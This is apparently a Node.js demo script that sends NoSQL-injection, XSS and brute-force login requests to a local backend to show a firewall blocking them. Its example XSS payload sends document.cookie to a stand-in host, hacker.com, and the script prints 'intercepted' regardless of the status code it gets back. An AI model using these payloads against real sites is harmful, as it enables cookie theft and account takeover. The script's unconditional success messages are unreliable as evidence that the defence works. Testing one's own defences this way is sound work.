const http = require('http');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const askQuestion = (query) => new Promise(resolve => rl.question(query, resolve));

async function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function runDemo() {
    console.log('\n=========================================================');
    console.log('🛡️  SURAKSHA-SETU SECURITY FIREWALL DEMONSTRATION 🛡️');
    console.log('=========================================================\n');
    console.log('Welcome to the interactive Live Attack Simulator.');
    console.log('You can copy and paste real attack payloads from the internet to test the firewall.\n');

    // 1. NoSQL Injection Demo
    console.log('▶ TEST 1: NoSQL Database Injection Attack');
    console.log('  Instead of a normal email, an attacker tries to inject a NoSQL operator.');
    console.log('  Example payload to copy/paste: {"$gt": ""}');
    
    let noSqlPayload = await askQuestion('\n  [?] Enter your NoSQL Injection payload for the email field: ');
    
    // Attempt to parse it as JSON if they typed an object, otherwise send as string
    let parsedNoSql;
    try {
        parsedNoSql = JSON.parse(noSqlPayload);
    } catch(e) {
        parsedNoSql = noSqlPayload;
    }

    console.log('\n  [>] Sending malicious payload to /api/auth/login...');
    await delay(1000);
    
    try {
        const noSqlRes = await fetch('http://localhost:5000/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: parsedNoSql, password: 'hacked' })
        });
        
        console.log(`  [✔] RESULT: Backend intercepted attack. Status: ${noSqlRes.status}`);
        console.log('  [✔] EXPLANATION: The firewall stripped the malicious operators before they reached the database.\n');
    } catch (e) {
        console.log('  [!] Error connecting to backend. Is it running?\n');
    }

    // 2. XSS Demo
    console.log('---------------------------------------------------------');
    console.log('▶ TEST 2: Cross-Site Scripting (XSS) Attack');
    console.log('  An attacker attempts to inject malicious JavaScript into the form.');
    console.log('  Example payload to copy/paste: <script>fetch("http://hacker.com?cookie="+document.cookie)</script>test@example.com');
    
    let xssPayload = await askQuestion('\n  [?] Enter your XSS payload: ');

    console.log('\n  [>] Sending payload to backend...');
    await delay(1000);
    
    try {
        const xssRes = await fetch('http://localhost:5000/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: xssPayload, password: 'test' })
        });
        
        console.log(`  [✔] RESULT: Backend intercepted attack. Status: ${xssRes.status}`);
        console.log('  [✔] EXPLANATION: xss-clean sanitized the input, stripping the <script> tags entirely so it cannot be executed or saved.\n');
    } catch (e) {
        console.log('  [!] Error connecting to backend.\n');
    }

    // 3. Brute Force Demo
    console.log('---------------------------------------------------------');
    console.log('▶ TEST 3: Brute Force Password Attack (Rate Limiter)');
    console.log('  An attacker attempts to guess passwords by sending rapid requests.');
    
    let numRequests = await askQuestion('\n  [?] How many rapid login attempts should the hacker send? (e.g. 20): ');
    let count = parseInt(numRequests) || 20;

    console.log(`\n  [>] Firing ${count} rapid requests at the server...`);
    await delay(1000);
    
    let blocked = false;
    for (let i = 1; i <= count; i++) {
        try {
            const res = await fetch('http://localhost:5000/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: 'test@example.com', password: 'wrong' })
            });
            
            if (res.status === 429) {
                console.log(`\n  [💥] Request ${i}: BLOCKED! Status 429 (Too Many Requests)`);
                const data = await res.json();
                console.log(`  [💥] Firewall Response: "${data.error}"`);
                blocked = true;
                break;
            } else {
                process.stdout.write(`  [>] Req ${i}... `);
            }
        } catch (e) {}
    }

    if (blocked) {
        console.log('\n  [✔] EXPLANATION: The strict authentication rate-limiter detected the brute-force anomaly and blocked the IP address.');
    } else {
        console.log('\n  [!] The firewall allowed the requests because it didn\'t hit the 15 request threshold.');
    }
    
    console.log('\n=========================================================');
    console.log('✅ DEMONSTRATION COMPLETE - SYSTEM IS SECURE');
    console.log('=========================================================\n');

    rl.close();
}

runDemo();
